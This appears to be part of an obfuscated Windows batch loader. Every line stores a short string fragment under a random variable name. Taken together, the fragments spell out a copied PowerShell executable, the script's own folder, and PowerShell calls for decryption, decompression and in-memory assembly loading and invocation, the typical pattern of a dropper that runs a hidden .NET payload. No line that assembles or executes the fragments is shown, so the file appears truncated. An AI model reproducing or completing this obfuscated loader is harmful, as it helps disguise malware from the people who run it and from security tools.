@echo off
set "wJsvhldjGA=.e"
set "GrgrWtyrmz=Wi"
set "RkJfhBwxcM= C"
set "IkEqopfUOj=:\"
set "ipwXyOzHrH=ws"
set "UgSaJpcBjE=st"
set "yhiieIlvPR=\v"
set "QTCvZqRpXH=he"
set "irwXyRqDqo=do"
set "CwackeBLnw=py"
set "ZGXdQzerjO=s\"
set "SRAhZQVkbu=Po"
set "WatQmxIKMv=0\"
set "UsyKrDMfQl=xe"
set "tdPoJvgMfl=32"
set "evzgXlbYrr=we"
set "DkGfshgkgy=rS"
set "fMpWZTOWtB=\W"
set "RsvvZYsXyn= /"
set "rpXWIAAnTb=ll"
set "CXqvZIKurr=po"
set "ZBJupLtIDW=he"
set "delDzWmfuR=Sy"
set "xCiFmpAUcS=in"
set "IeekpWPsrQ=co"
set "JKeDEbJonM=1."
set "BODrAGOUIw=em"
set "ArpEirSJNU=ow"
set "VfCVtWFiTL=ll"
set "YzyUkqinme=y "
set "nqUhOyNsVG=rs"
set "VlKndNpryi=we"
set "nLYyWxuZcN=nd"
set "CKeCMWDvaM=cd"
set "MqTZsbTsZi= %~dp0"
set "uWEtmkqvpL=[Sys"
set "PrbyGfctou=($YW"
set "vkvkvaNYlS=New-"
set "HsXGfypMjy=Conv"
set "AnwjJhPblU=E.En"
set "SHZIQImMYr= [Sy"
set "qiidSMRFKi=3); "
set "gywyOoSCkf=nage"
set "SIHaXCaqIW=$CIS"
set "ihEkzWPEbl=-1.."
set "XnzknyYPHc=.Len"
set "cSWYdRBhAn=and "
set "fYptydZbzx=th('"
set "lDlkUvzyas=Comp"
set "yLvadQLfrl=$tkf"
set "zxAIzDLUlB='[-1"
set "jKvhvsZWTZ=tS ="
set "bbJxosmdWM=form"
set "aMeCYhHhgv=sion"
set "bKGMNlsqgV=.Com"
set "kdYxEpRoVo=New-"
set "bBiXOCUUBm=ptog"
set "AiKbiZRszP=ss -"
set "EHUShrreip=..-1"
set "gcdpJfnHAr='[-1"
set "jCncqvcqnu=);$w"
set "AKkyXSCXmT=Star"
set "uLCLvBrGAv=ay()"
set "vgcKsTmaxv=0O+g"
set "BVhhBmhHMp=comm"
set "qtIPMpxrSD=+hAO"
set "tQAZnhTOGk=ISEX"
set "rlacapYRpg=in $"
set "VfPRsEWHPs=736u"
set "yymzXaMUpj=yste"
set "GhSZdWItbf=();$"
set "BZchuwFcCi=gth)"
set "BeDnzJFLQJ=stem"
set "GenXRuRpci=vert"
set "LnejGaZnxT=Fina"
set "MwqSlSaQXp=YWfa"
set "sQSZvQQRCf=ISEX"
set "cwxWsybSNQ=.-16"
set "xqwKXmcZyo=rt]:"
set "yMEmSDYEhD=lVO."
set "JAychtLsQy=::('"
set "hzAZakisfd=$aQU"
set "YLLmIvRyDO=ptor"
set "eCwcvnxYWp= [Sy"
set "idBYRfuTFe=-Obj"
set "IwHPNMuqmQ=Syst"
set "YXjmjTIpiH=k; }"
set "UpqnTNTBpJ=;$Ox"
set "FxjFKPFlEc=ZYYc"
set "prlzUkcrBN=zfX."
set "wkXvWBwlNP=[IO."
set "HiNvKUsnAQ=faE "
set "XwVNgYvmnK= = $"
set "bGKpOZVNOg=EX.I"
set "lPQNKBvQZU=  $M"
set "VpAebSJjEx=Disp"
set "ukHuYPXPQi=pose"
set "EOhzCdmOKL=Invo"
set "EqRuMiWdLP=] -j"
set "KKtkcLwMlf=mory"
set "ODLhEnyDUp=fore"
set "lRumyhZHsr=16] "
set "oPQpjUnhVg=);$O"
set "XrZdfyLoaP=esFX"
set "nXezcYCbvV=ect "
set "yczbAvCUlX=oryS"
set "EfsKoTlCqF=);$C"
set "cwbBtTRSkP=iy.D"
set "biGAGxnnpR=n ''"
set "bZACTQTHqi=ispo"
set "cLwpUCpKga=ress"
set "blEqdXINRQ=E.Su"
set "PFqAdpxCjf=);$C"
set "ZERDcCCbkU=oGPt"
set "OTGYqSSorA=y = "
set "SByPmqZgsU=JZSW"
set "RWniYJYnxN=kfeg"
set "WoryvzNguF=$oGP"
set "nPIZTPHQGr=Syst"
set "xaneYCXJzl=bjec"
set "ggDfwCDEfT=UGTu"
set "jZLqbrBktC=.IO."
set "MIFkqGeJBF=ress"
set "wMdrbQKWaT=v4Ir"
set "EGmuNzyyTD=comp"
set "niocgBSIBN=;$Qy"
set "pBomzYDeNk=:('g"
set "ZNfhfTfRTs=d;$C"
set "RQTIUZdvLq=$oGP"
set "zVuSctMTvZ=n ''"
set "UPnSzxVCsK=1] -"
set "xIAMoOvzqi=.Ass"
set "FcXRqbRKJr=ose("
set "zJKGksnNOZ=ion."
set "GIqtKohvdp=m(, "
set "dQriaIBJWO=join"
set "vfmtFXlcez=ISEX"
set "CLPxjPRWeN=Secu"
set "HiBAyvHavC=).Sp"
set "CBuwfhTCTS=.Mod"
